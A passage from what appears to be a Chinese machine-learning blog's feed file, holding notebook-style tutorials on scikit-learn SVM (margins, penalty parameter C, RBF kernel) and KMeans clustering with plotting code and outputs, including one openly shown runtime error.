y_1, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line"><span class="comment"># 画边距</span></span><br><span class="line">plt.fill_between(x_fit, y_1 - <span class="number">0.6</span>, y_1 + <span class="number">0.6</span>, edgecolor=<span class="string">&#x27;none&#x27;</span>, </span><br><span class="line">                 color=<span class="string">&#x27;#AAAAAA&#x27;</span>, alpha=<span class="number">0.4</span>)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PolyCollection at 0x1d0502606a0&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_19_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>那么，我们现在的分类器是最优分类器吗？</p><p>或者说，有没有更好的分类器，它具有更大的间隔？</p><p>答案是有的。</p><p>为了找出最优分类器，我们需要引入我们今天的主角：SVM</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.svm <span class="keyword">import</span> SVC</span><br><span class="line"><span class="comment"># SVM 函数</span></span><br><span class="line">clf = SVC(kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br></pre></td></tr></table></figure><pre><code>SVC(kernel='linear')</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 最佳函数</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>]</span><br><span class="line">y_3 = a*x_fit - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大边距 下届</span></span><br><span class="line">b_down = clf.support_vectors_[<span class="number">0</span>]</span><br><span class="line">y_down = a* x_fit + b_down[<span class="number">1</span>] - a * b_down[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 最大边距 上届</span></span><br><span class="line">b_up = clf.support_vectors_[-<span class="number">1</span>]</span><br><span class="line">y_up = a* x_fit + b_up[<span class="number">1</span>] - a * b_up[<span class="number">0</span>]</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">plt.plot(x_fit, y_3, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line"><span class="comment"># 画边距</span></span><br><span class="line">plt.fill_between(x_fit, y_down, y_up, edgecolor=<span class="string">&#x27;none&#x27;</span>, color=<span class="string">&#x27;#AAAAAA&#x27;</span>, alpha=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 画支持向量</span></span><br><span class="line">plt.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>], edgecolor=<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">            s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d05031fa90&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_23_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>带黑边的点是距离当前分类器最近的点，我们称之为支持向量。</p><p>支持向量机为我们提供了在众多可能的分类器之间进行选择的原则，从而确保对未知数据集具有更高的泛化性。</p><h2 id="32-软间隔"><a class="markdownIt-Anchor" href="#32-软间隔">#</a> 3.2 软间隔</h2><p>但很多时候，我们拿到的数据是这样子的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.9</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d050383710&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_25_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>这种情况并不容易找到这样的最大间隔。</p><p>于是我们就有了软间隔，相比于硬间隔而言，我们允许个别数据出现在间隔带中。</p><p>我们知道，如果没有一个原则进行约束，满足软间隔的分类器也会出现很多条。</p><p>所以需要对分错的数据进行惩罚，SVC 函数中，有一个参数 C 就是惩罚参数。</p><p>惩罚参数越小，容忍性就越大。</p><p>以 C=1 为例子，比如说：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.9</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"><span class="comment"># 惩罚参数：C=1 </span></span><br><span class="line">clf = SVC(C=<span class="number">1</span>, kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最佳函数</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>]</span><br><span class="line">y_3 = a*x_fit - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 最大边距 下届</span></span><br><span class="line">b_down = clf.support_vectors_[<span class="number">0</span>]</span><br><span class="line">y_down = a* x_fit + b_down[<span class="number">1</span>] - a * b_down[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 最大边距 上届</span></span><br><span class="line">b_up = clf.support_vectors_[-<span class="number">1</span>]</span><br><span class="line">y_up = a* x_fit + b_up[<span class="number">1</span>] - a * b_up[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">plt.plot(x_fit, y_3, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line"><span class="comment"># 画边距</span></span><br><span class="line">plt.fill_between(x_fit, y_down, y_up, edgecolor=<span class="string">&#x27;none&#x27;</span>, color=<span class="string">&#x27;#AAAAAA&#x27;</span>, alpha=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 画支持向量</span></span><br><span class="line">plt.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>], edgecolor=<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">            s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d0504224a8&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_27_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>惩罚参数 C=0.2 时，SVM 会更具包容性，从而兼容更多的错分样本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.9</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"><span class="comment"># 惩罚参数：C=0.2 </span></span><br><span class="line">clf = SVC(C=<span class="number">0.2</span>, kernel=<span class="string">&#x27;linear&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br><span class="line"></span><br><span class="line">x_fit = np.linspace(-<span class="number">1.5</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment"># 最佳函数</span></span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>]</span><br><span class="line">y_3 = a*x_fit - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"><span class="comment"># 最大边距 下届</span></span><br><span class="line">b_down = clf.support_vectors_[<span class="number">10</span>]</span><br><span class="line">y_down = a* x_fit + b_down[<span class="number">1</span>] - a * b_down[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># 最大边距 上届</span></span><br><span class="line">b_up = clf.support_vectors_[<span class="number">1</span>]</span><br><span class="line">y_up = a* x_fit + b_up[<span class="number">1</span>] - a * b_up[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_blobs(n_samples=<span class="number">60</span>, centers=<span class="number">2</span>, random_state=<span class="number">0</span>, cluster_std=<span class="number">0.4</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"><span class="comment"># 画函数</span></span><br><span class="line">plt.plot(x_fit, y_3, <span class="string">&#x27;-c&#x27;</span>)</span><br><span class="line"><span class="comment"># 画边距</span></span><br><span class="line">plt.fill_between(x_fit, y_down, y_up, edgecolor=<span class="string">&#x27;none&#x27;</span>, color=<span class="string">&#x27;#AAAAAA&#x27;</span>, alpha=<span class="number">0.4</span>)</span><br><span class="line"><span class="comment"># 画支持向量</span></span><br><span class="line">plt.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>], edgecolor=<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">            s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>&lt;matplotlib.collections.PathCollection at 0x1d05049e390&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_29_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><h2 id="33-超平面"><a class="markdownIt-Anchor" href="#33-超平面">#</a> 3.3 超平面</h2><p>如果我们遇到这样的数据集，没有办法利用线性分类器进行分类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_circles</span><br><span class="line"><span class="comment"># 画散点图</span></span><br><span class="line">X, y = make_circles(<span class="number">100</span>, factor=<span class="number">.1</span>, noise=<span class="number">.1</span>, random_state=<span class="number">2019</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line"></span><br><span class="line">clf = SVC(kernel=<span class="string">&#x27;linear&#x27;</span>).fit(X, y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 最佳函数</span></span><br><span class="line">x_fit = np.linspace(-<span class="number">1.5</span>, <span class="number">1.5</span>)</span><br><span class="line">w = clf.coef_[<span class="number">0</span>]</span><br><span class="line">a = -w[<span class="number">0</span>] / w[<span class="number">1</span>]</span><br><span class="line">y_3 = a*X - (clf.intercept_[<span class="number">0</span>]) / w[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">plt.plot(X, y_3, <span class="string">&#x27;-c&#x27;</span>)</span><br></pre></td></tr></table></figure><pre><code>[&lt;matplotlib.lines.Line2D at 0x1d050524dd8&gt;, &lt;matplotlib.lines.Line2D at 0x1d050524e80&gt;]</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_31_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>我们可以将二维（低维）空间的数据映射到三维（高维）空间中。</p><p>此时，我们便可以通过一个超平面对数据进行划分</p><p>所以，我们映射的目的在于使用 SVM 在高维空间找到超平面的能力。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 数据映射</span></span><br><span class="line">r = np.exp(-(X[:, <span class="number">0</span>] ** <span class="number">2</span> + X[:, <span class="number">1</span>] ** <span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">ax = plt.subplot(projection=<span class="string">&#x27;3d&#x27;</span>)</span><br><span class="line">ax.scatter3D(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], r, c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">ax.set_zlabel(<span class="string">&#x27;z&#x27;</span>)</span><br><span class="line"></span><br><span class="line">x_1, y_1 = np.meshgrid(np.linspace(-<span class="number">1</span>, <span class="number">1</span>), np.linspace(-<span class="number">1</span>, <span class="number">1</span>))</span><br><span class="line">z =  <span class="number">0.01</span>*x_1 + <span class="number">0.01</span>*y_1 + <span class="number">0.5</span></span><br><span class="line">ax.plot_surface(x_1, y_1, z, alpha=<span class="number">0.3</span>)</span><br></pre></td></tr></table></figure><pre><code>&lt;mpl_toolkits.mplot3d.art3d.Poly3DCollection at 0x1d050564978&gt;</code></pre><p>​<br><img "" class="lazyload placeholder" data-original="output_33_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>在 SVC 中，我们可以用高斯核函数来实现这以功能：kernel=‘rbf’</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 画图</span></span><br><span class="line">X, y = make_circles(<span class="number">100</span>, factor=<span class="number">.1</span>, noise=<span class="number">.1</span>, random_state=<span class="number">2019</span>)</span><br><span class="line">plt.scatter(X[:, <span class="number">0</span>], X[:, <span class="number">1</span>], c=y, s=<span class="number">50</span>, cmap=plt.cm.Paired)</span><br><span class="line">clf = SVC(kernel=<span class="string">&#x27;rbf&#x27;</span>)</span><br><span class="line">clf.fit(X, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ax = plt.gca()</span><br><span class="line">x = np.linspace(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">y = np.linspace(-<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">x_1, y_1 = np.meshgrid(x, y)</span><br><span class="line">P = np.zeros_like(x_1)</span><br><span class="line"><span class="keyword">for</span> i, xi <span class="keyword">in</span> <span class="built_in">enumerate</span>(x):</span><br><span class="line">    <span class="keyword">for</span> j, yj <span class="keyword">in</span> <span class="built_in">enumerate</span>(y):</span><br><span class="line">        P[i, j] = clf.decision_function(np.array([[xi, yj]]))</span><br><span class="line">ax.contour(x_1, y_1, P, colors=<span class="string">&#x27;k&#x27;</span>, levels=[-<span class="number">1</span>, <span class="number">0</span>, <span class="number">0.9</span>], alpha=<span class="number">0.5</span>,</span><br><span class="line">            linestyles=[<span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;--&#x27;</span>])</span><br><span class="line"></span><br><span class="line">plt.scatter(clf.support_vectors_[:, <span class="number">0</span>], clf.support_vectors_[:, <span class="number">1</span>], edgecolor=<span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">            s=<span class="number">80</span>, facecolors=<span class="string">&#x27;none&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_35_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p>此时便完成了非线性分类。</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KMeans</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KMeans/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KMeans/</url>
      
        <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> make_blobs</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> sklearn.cluster <span class="keyword">import</span> KMeans</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建数据</span></span><br><span class="line"><span class="comment">#make_blobs 聚类生成器</span></span><br><span class="line">x, y_true = make_blobs(n_samples = <span class="number">1000</span>, <span class="comment">#生成1000条数据</span></span><br><span class="line">                       centers =<span class="number">5</span>, <span class="comment">#5类数据</span></span><br><span class="line">                       cluster_std = <span class="number">0.5</span>, <span class="comment">#方差一致</span></span><br><span class="line">                       random_state = <span class="number">9</span>) <span class="comment">#随机数种子</span></span><br><span class="line"><span class="comment">#x.shape #(300, 2)</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">model = KMeans(n_clusters=<span class="number">5</span>)<span class="comment">#n_clusters是k</span></span><br><span class="line">model.fit(x)</span><br><span class="line">y_kmeans = model.predict(x)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c = y_kmeans, cmap=<span class="string">&#x27;Dark2&#x27;</span>, s=<span class="number">50</span>, alpha=<span class="number">0.5</span>, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"></span><br><span class="line">centroids = model.cluster_centers_</span><br><span class="line">plt.scatter(centroids[:,<span class="number">0</span>], centroids[:,<span class="number">1</span>],c=[<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>],cmap=<span class="string">&#x27;Dark2&#x27;</span>,s=<span class="number">250</span>, marker=<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;K-means 1000 points&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Value1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Value2&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_1_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_1_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">x, y_true = make_blobs(n_samples = <span class="number">1000</span>, <span class="comment">#生成300条数据</span></span><br><span class="line">                       centers = <span class="number">2</span>, <span class="comment">#5类数据</span></span><br><span class="line">                       cluster_std = <span class="number">0.6</span>, <span class="comment">#方差一致</span></span><br><span class="line">                       random_state = <span class="number">8</span>) <span class="comment">#随机数种子</span></span><br><span class="line">x.shape <span class="comment">#(300, 2)</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>],c=y_true,s=<span class="number">10</span>, alpha=<span class="number">0.8</span>)</span><br><span class="line">model = KMeans(n_clusters =<span class="number">2</span>)</span><br><span class="line">model.fit(x)</span><br><span class="line">xmin,xmax=x[:,<span class="number">0</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">0</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line">ymin,ymax=x[:,<span class="number">1</span>].<span class="built_in">min</span>()-<span class="number">1</span>,x[:,<span class="number">1</span>].<span class="built_in">max</span>()+<span class="number">1</span></span><br><span class="line">x1,y1=np.meshgrid(np.arange(xmin,xmax,<span class="number">0.1</span>),np.arange(ymin,ymax,<span class="number">0.02</span>))</span><br><span class="line">z=model.predict(np.c_[x1.ravel(),y1.ravel()])</span><br><span class="line">z=z.reshape(x1.shape)</span><br><span class="line">y_kmeans = model.predict(x)</span><br><span class="line">plt.figure()</span><br><span class="line">plt.pcolormesh(x1,y1,z,cmap=plt.cm.Pastel1,shading=<span class="string">&#x27;auto&#x27;</span>,)</span><br><span class="line">plt.scatter(x[:,<span class="number">0</span>], x[:,<span class="number">1</span>], c = y_kmeans, cmap=<span class="string">&#x27;Dark2&#x27;</span>, s=<span class="number">50</span>, alpha=<span class="number">0.5</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">centroids = model.cluster_centers_</span><br><span class="line">plt.scatter(centroids[:,<span class="number">0</span>], centroids[:,<span class="number">1</span>],c=[<span class="number">0</span>,<span class="number">1</span>],cmap=<span class="string">&#x27;Dark2&#x27;</span>,s=<span class="number">70</span>, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;K-means 1000 points&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Value1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Value2&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line">n=<span class="number">10</span></span><br><span class="line">dis=np.zeros([n,n])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    distances = np.sqrt(np.<span class="built_in">sum</span>(np.asarray(centroids[i,:] - centroids)**<span class="number">2</span>, axis=<span class="number">1</span>))</span><br><span class="line">    dis[i,:]=distances</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_2_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_2_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><pre><code>---------------------------------------------------------------------------ValueError                                Traceback (most recent call last)&lt;ipython-input-6-73969d6b1829&gt; in &lt;module&gt;     27 for i in range(n):     28     distances = np.sqrt(np.sum(np.asarray(centroids[i,:] - centroids)**2, axis=1))---&gt; 29     dis[i,:]=distancesValueError: could not broadcast input array from shape (2) into shape (10)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 机器学习课程(魏) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KNN</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KNN/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KNN/</url>
      
